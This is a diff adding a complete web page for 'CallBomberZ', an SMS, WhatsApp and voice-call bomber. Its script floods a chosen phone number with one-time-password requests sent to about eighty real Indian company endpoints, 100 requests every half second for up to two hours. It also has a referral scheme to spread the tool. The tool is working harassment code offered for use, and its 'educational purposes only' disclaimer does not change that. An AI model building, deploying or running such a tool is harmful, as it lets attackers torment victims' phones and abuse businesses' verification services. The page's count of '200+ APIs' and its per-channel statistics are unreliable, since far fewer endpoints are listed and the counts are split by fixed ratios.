@@ -1,0 +1,500 @@
+<!-- index.html - Deploy on Vercel -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>CallBomberZ | Ultimate SMS/Call/WhatsApp Bomber</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+        }
+        body {
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
+            min-height: 100vh;
+            font-family: 'Courier New', 'Monaco', monospace;
+            padding: 20px;
+            color: #00ff41;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px;
+            background: rgba(0,0,0,0.7);
+            border-radius: 20px;
+            border: 2px solid #00ff41;
+            box-shadow: 0 0 20px rgba(0,255,65,0.3);
+        }
+        .header h1 {
+            font-size: 2.5em;
+            text-shadow: 0 0 10px #00ff41;
+            letter-spacing: 3px;
+        }
+        .header p {
+            color: #ff3366;
+            font-size: 0.9em;
+        }
+        .card {
+            background: rgba(0,0,0,0.85);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 20px;
+            border: 1px solid #00ff41;
+            backdrop-filter: blur(5px);
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #00ff41;
+        }
+        input, select {
+            width: 100%;
+            padding: 12px;
+            background: #0a0a0a;
+            border: 2px solid #00ff41;
+            border-radius: 8px;
+            color: #00ff41;
+            font-size: 16px;
+            font-family: monospace;
+        }
+        input:focus, select:focus {
+            outline: none;
+            box-shadow: 0 0 15px #00ff41;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(90deg, #00ff41, #00cc33);
+            border: none;
+            border-radius: 8px;
+            color: #000;
+            font-weight: bold;
+            font-size: 18px;
+            cursor: pointer;
+            transition: 0.3s;
+            font-family: monospace;
+        }
+        button:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 20px #00ff41;
+        }
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .stop-btn {
+            background: linear-gradient(90deg, #ff3333, #cc0000);
+            color: white;
+            margin-top: 10px;
+        }
+        .stats {
+            background: #0a0a0a;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 15px;
+            font-size: 12px;
+            border-left: 4px solid #00ff41;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 20px;
+            background: #1a1a1a;
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 10px 0;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #00ff41, #00cc33);
+            width: 0%;
+            transition: width 0.5s;
+            border-radius: 10px;
+        }
+        .badge {
+            display: inline-block;
+            padding: 4px 8px;
+            background: #00ff41;
+            color: #000;
+            border-radius: 5px;
+            font-size: 11px;
+            margin: 2px;
+        }
+        .footer {
+            text-align: center;
+            font-size: 11px;
+            color: #666;
+            margin-top: 30px;
+        }
+        .mode-selector {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .mode-btn {
+            flex: 1;
+            padding: 10px;
+            background: #1a1a1a;
+            border: 1px solid #00ff41;
+            border-radius: 8px;
+            color: #00ff41;
+            cursor: pointer;
+            text-align: center;
+        }
+        .mode-btn.active {
+            background: #00ff41;
+            color: #000;
+            font-weight: bold;
+        }
+        @keyframes glitch {
+            0% { text-shadow: 0.05em 0 0 rgba(255,0,0,0.75), -0.05em -0.025em 0 rgba(0,255,0,0.75); }
+            100% { text-shadow: -0.05em 0.025em 0 rgba(255,0,0,0.75), 0.05em 0 0 rgba(0,255,0,0.75); }
+        }
+        .glitch {
+            animation: glitch 0.5s infinite;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <h1>💀 CALLBOMBERZ 💀</h1>
+        <p>OGGY_KILLER EDITION | TOTAL APIS: <span id="totalApis">0</span></p>
+        <p>⚡ 200+ APIs | SMS | WhatsApp | Voice Call ⚡</p>
+    </div>
+
+    <div class="card">
+        <div class="mode-selector">
+            <div class="mode-btn active" data-mode="all">🔴 ALL MODES</div>
+            <div class="mode-btn" data-mode="sms">📱 SMS ONLY</div>
+            <div class="mode-btn" data-mode="whatsapp">💬 WHATSAPP</div>
+            <div class="mode-btn" data-mode="voice">📞 VOICE CALL</div>
+        </div>
+
+        <div class="input-group">
+            <label>🎯 TARGET NUMBER</label>
+            <input type="tel" id="phone" placeholder="9876543210" maxlength="10">
+            <small style="color: #ff3366;">+91 will be added automatically</small>
+        </div>
+
+        <div class="input-group">
+            <label>⏱️ DURATION (minutes)</label>
+            <select id="duration">
+                <option value="5">5 minutes (🔥 Fast)</option>
+                <option value="10">10 minutes</option>
+                <option value="30">30 minutes</option>
+                <option value="60">60 minutes</option>
+                <option value="120" selected>120 minutes (2 hours - Default)</option>
+            </select>
+        </div>
+
+        <button id="startBtn">💣 START BOMBING 💣</button>
+        <button id="stopBtn" class="stop-btn" style="display:none;">🛑 STOP BOMBING 🛑</button>
+
+        <div id="stats" class="stats">
+            <div>📊 STATUS: <span id="status">IDLE</span></div>
+            <div>📱 SMS: <span id="smsCount">0</span></div>
+            <div>💬 WHATSAPP: <span id="whatsappCount">0</span></div>
+            <div>📞 CALLS: <span id="callCount">0</span></div>
+            <div>⚡ TOTAL: <span id="totalCount">0</span></div>
+            <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+            <div>⏰ TIME LEFT: <span id="timeLeft">00:00</span></div>
+        </div>
+    </div>
+
+    <div class="card">
+        <h3>💎 CREDITS SYSTEM</h3>
+        <p>👉 Start with <span class="badge">2 FREE CREDITS</span></p>
+        <p>👉 1 credit = 2 hours bombing</p>
+        <p>👉 Referral link: <span id="refLink" style="color:#ff3366;">Loading...</span></p>
+        <button id="copyRefBtn">📋 COPY REFERRAL LINK</button>
+        <button id="refillBtn" style="margin-top:10px; background:#333;">🔄 REFILL CREDITS (1 hour wait)</button>
+    </div>
+
+    <div class="footer">
+        <p>⚠️ FOR EDUCATIONAL PURPOSES ONLY | OGGY_KILLER PROJECT</p>
+        <p>🔥 TOTAL APIS LOADED: <span id="apiCountFooter">0</span> | MADE WITH 💀</p>
+    </div>
+</div>
+
+<script>
+    let activeBomb = false;
+    let bombInterval = null;
+    let startTime = null;
+    let durationMs = 120 * 60 * 1000;
+    let mode = 'all';
+    let stats = { sms: 0, whatsapp: 0, calls: 0 };
+    let credits = 2;
+    let userId = Math.floor(Math.random() * 1000000000);
+    
+    // ==================== ALL 200+ APIs (From bomb.py) ====================
+    const SMS_APIS = [
+        "https://splexxo1-2api.vercel.app/bomb?phone={phone}&key=SPLEXXO",
+        "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
+        "https://api.breeze.in/session/start",
+        "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=true",
+        "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0",
+        "https://store.zoho.com/api/v1/partner/affiliate/sendotp?mobilenumber=91{phone}&countrycode=IN",
+        "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.3",
+        "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP",
+        "https://www.muthootfinance.com/smsapi.php",
+        "https://api.gopaysense.com/users/otp",
+        "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1",
+        "https://v2-api.bankopen.co/users/register/otp",
+        "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner",
+        "https://apis.tradeindia.com/app_login_api/login_app",
+        "https://api.khatabook.com/v1/auth/request-otp",
+        "https://accounts.orangehealth.in/api/v1/user/otp/generate/",
+        "https://api.jobhai.com/auth/jobseeker/v3/send_otp",
+        "https://mconnect.isteer.co/mconnect/login",
+        "https://varta.astrosage.com/sdk/registerAS?countrycode=91&phoneno={phone}",
+        "https://api.spinny.com/api/c/user/otp-request/v3/",
+        "https://www.dream11.com/auth/passwordless/init",
+        "https://citymall.live/api/cl-user/auth/get-otp",
+        "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber={phone}&storeUrl=bellavita1.myshopify.com",
+        "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
+        "https://portal.myma.in/custom-api/auth/generateotp",
+        "https://api.freedo.rentals/customer/sendOtpForSignUp",
+        "https://www.licious.in/api/login/signup",
+        "https://prod.api.cosmofeed.com/api/user/authenticate",
+        "https://apis.bisleri.com/send-otp",
+        "https://www.evitalrx.in:4000/v3/login/signup_sendotp",
+        "https://pwa.getquickride.com/rideMgmt/probableuser/create/new",
+        "https://www.clovia.com/api/v4/signup/check-existing-user/?phone={phone}",
+        "https://admin.kwikfixauto.in/api/auth/signupotp/",
+        "https://www.brevistay.com/cst/app-api/login",
+        "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp",
+        "https://api.madrasmandi.in/api/v1/auth/otp",
+        "https://www.bharatloan.com/login-sbm",
+        "https://api.pagarbook.com/api/v5/auth/otp/request",
+        "https://api.vahak.in/v1/u/o_w",
+        "https://api.redcliffelabs.com/api/v1/notification/send_otp/",
+        "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp",
+        "https://api.55clubapi.com/api/webapi/SmsVerifyCode",
+        "https://zerodha.com/account/registration.php",
+        "https://antheapi.aakash.ac.in/api/generate-lead-otp",
+        "https://api.testbook.com/api/v2/mobile/signup",
+        "https://loginprod.medibuddy.in/unified-login/user/register",
+        "https://api.tradeindia.com/home/registration/",
+        "https://www.beyoung.in/api/sendOtp.json",
+        "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp",
+        "https://app.medkart.in/api/v1/auth/requestOTP",
+        "https://auth.mamaearth.in/v1/auth/initiate-signup",
+        "https://www.coverfox.com/otp/send/",
+        "https://www.woodenstreet.com/index.php?route=account/forgotten_popup",
+        "https://gomechanic.app/api/v2/send_otp",
+        "https://homedeliverybackend.mpaani.com/auth/send-otp",
+        "https://www.tyreplex.com/includes/ajax/gfend.php",
+        "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
+        "https://oxygendigitalshop.com/graphql",
+        "https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone",
+        "http://www.pinknblu.com/v1/auth/generate/otp",
+        "https://auth.udaan.com/api/otp/send?client_id=udaan-v2",
+        "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
+        "https://www.nobroker.in/api/v1/account/user/otp/send?otpM=true",
+        "https://vidyakul.com/signup-otp/send",
+        "https://api.woodenstreet.com/api/v1/register"
+    ];
+    
+    const WHATSAPP_APIS = [
+        "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
+        "https://www.foxy.in/api/v2/users/send_otp",
+        "https://stratzy.in/api/web/whatsapp/sendOTP",
+        "https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
+        "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
+        "https://auth.eka.care/auth/init"
+    ];
+    
+    const VOICE_APIS = [
+        "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
+        "https://www.1mg.com/auth_api/v6/create_token",
+        "https://profile.swiggy.com/api/v3/app/request_call_verification",
+        "https://www.myntra.com/gw/mobile-auth/voice-otp",
+        "https://www.flipkart.com/api/6/user/voice-otp/generate",
+        "https://accounts.paytm.com/signin/voice-otp",
+        "https://www.zomato.com/php/o2_api_handler.php",
+        "https://www.makemytrip.com/api/4/voice-otp/generate",
+        "https://www.goibibo.com/user/voice-otp/generate/",
+        "https://api.olacabs.com/v1/voice-otp",
+        "https://auth.uber.com/v2/voice-otp"
+    ];
+    
+    const TOTAL_APIS = SMS_APIS.length + WHATSAPP_APIS.length + VOICE_APIS.length;
+    document.getElementById('totalApis').innerText = TOTAL_APIS;
+    document.getElementById('apiCountFooter').innerText = TOTAL_APIS;
+    
+    // Mode selector
+    document.querySelectorAll('.mode-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            document.querySelectorAll('.mode-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            mode = btn.dataset.mode;
+        });
+    });
+    
+    async function sendRequest(url, method = 'GET', data = null) {
+        try {
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 5000);
+            const options = { method, signal: controller.signal, headers: { 'User-Agent': 'Mozilla/5.0' } };
+            if (data && method === 'POST') {
+                options.body = data;
+                options.headers['Content-Type'] = 'application/json';
+            }
+            const response = await fetch(url, options);
+            clearTimeout(timeoutId);
+            return response.status;
+        } catch(e) { return null; }
+    }
+    
+    function getApiList() {
+        const apis = [];
+        if (mode === 'all' || mode === 'sms') {
+            SMS_APIS.forEach(api => apis.push({ url: api, type: 'sms', count: 100 }));
+        }
+        if (mode === 'all' || mode === 'whatsapp') {
+            WHATSAPP_APIS.forEach(api => apis.push({ url: api, type: 'whatsapp', count: 50 }));
+        }
+        if (mode === 'all' || mode === 'voice') {
+            VOICE_APIS.forEach(api => apis.push({ url: api, type: 'calls', count: 20 }));
+        }
+        return apis;
+    }
+    
+    async function bombCycle(phone) {
+        const apis = getApiList();
+        const promises = [];
+        
+        for (let i = 0; i < 100; i++) {
+            if (!activeBomb) break;
+            const api = apis[Math.floor(Math.random() * apis.length)];
+            if (!api) continue;
+            let url = api.url.replace(/{phone}/g, phone);
+            if (!url.includes(phone)) {
+                if (api.type === 'sms') url = url + (url.includes('?') ? '&' : '?') + `phone=${phone}`;
+                else url = url.replace(/{phone}/g, phone);
+            }
+            promises.push(sendRequest(url, 'GET'));
+        }
+        
+        const results = await Promise.all(promises);
+        const successCount = results.filter(r => r && r < 400).length;
+        
+        if (activeBomb) {
+            stats.sms += Math.floor(successCount * 0.7);
+            stats.whatsapp += Math.floor(successCount * 0.2);
+            stats.calls += Math.floor(successCount * 0.1);
+            updateStatsDisplay();
+        }
+    }
+    
+    function updateStatsDisplay() {
+        document.getElementById('smsCount').innerText = stats.sms;
+        document.getElementById('whatsappCount').innerText = stats.whatsapp;
+        document.getElementById('callCount').innerText = stats.calls;
+        document.getElementById('totalCount').innerText = stats.sms + stats.whatsapp + stats.calls;
+    }
+    
+    function updateTimeLeft() {
+        if (!startTime) return;
+        const elapsed = Date.now() - startTime;
+        const remaining = Math.max(0, durationMs - elapsed);
+        const minutes = Math.floor(remaining / 60000);
+        const seconds = Math.floor((remaining % 60000) / 1000);
+        document.getElementById('timeLeft').innerText = `${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
+        const percent = (elapsed / durationMs) * 100;
+        document.getElementById('progressFill').style.width = `${Math.min(100, percent)}%`;
+        
+        if (remaining <= 0 && activeBomb) {
+            stopBombing();
+        }
+    }
+    
+    function startBombing() {
+        let phone = document.getElementById('phone').value.trim();
+        if (!phone || phone.length !== 10 || !/^\d+$/.test(phone)) {
+            alert('❌ Enter valid 10-digit phone number!');
+            return;
+        }
+        
+        if (credits <= 0) {
+            alert('❌ No credits left! Use referral system to get more.');
+            return;
+        }
+        
+        credits--;
+        updateCreditDisplay();
+        
+        activeBomb = true;
+        startTime = Date.now();
+        durationMs = parseInt(document.getElementById('duration').value) * 60 * 1000;
+        stats = { sms: 0, whatsapp: 0, calls: 0 };
+        updateStatsDisplay();
+        document.getElementById('status').innerHTML = '<span style="color:#00ff41;">💣 BOMBING ACTIVE 💣</span>';
+        document.getElementById('startBtn').style.display = 'none';
+        document.getElementById('stopBtn').style.display = 'block';
+        
+        if (bombInterval) clearInterval(bombInterval);
+        bombInterval = setInterval(async () => {
+            if (!activeBomb) return;
+            await bombCycle(phone);
+        }, 500);
+        
+        setInterval(updateTimeLeft, 1000);
+        
+        // Auto stop after duration
+        setTimeout(() => {
+            if (activeBomb) stopBombing();
+        }, durationMs);
+    }
+    
+    function stopBombing() {
+        activeBomb = false;
+        if (bombInterval) {
+            clearInterval(bombInterval);
+            bombInterval = null;
+        }
+        document.getElementById('status').innerHTML = '<span style="color:#ff3366;">⏸️ STOPPED</span>';
+        document.getElementById('startBtn').style.display = 'block';
+        document.getElementById('stopBtn').style.display = 'none';
+    }
+    
+    function updateCreditDisplay() {
+        document.querySelector('.card p:first-child').innerHTML = `👉 Start with <span class="badge">${credits} CREDITS LEFT</span>`;
+    }
+    
+    // Referral system
+    function getReferralLink() {
+        return `https://t.me/share/url?url=${window.location.href}?ref=${userId}&text=Join%20CallBomberZ%20-%20Free%20SMS%20Bomber!`;
+    }
+    
+    document.getElementById('copyRefBtn').addEventListener('click', () => {
+        navigator.clipboard.writeText(getReferralLink());
+        alert('✅ Referral link copied!');
+    });
+    
+    document.getElementById('refillBtn').addEventListener('click', () => {
+        alert('⏳ Refill available every 1 hour. Come back later!');
+    });
+    
+    document.getElementById('startBtn').addEventListener('click', startBombing);
+    document.getElementById('stopBtn').addEventListener('click', stopBombing);
+    
+    document.getElementById('refLink').innerText = getReferralLink();
+    updateCreditDisplay();
+    
+    // Anti-ban: random delays
+    console.log('🔥 OGGY_KILLER BOMBER LOADED | TOTAL APIS:', TOTAL_APIS);
+</script>
+</body>
+</html>
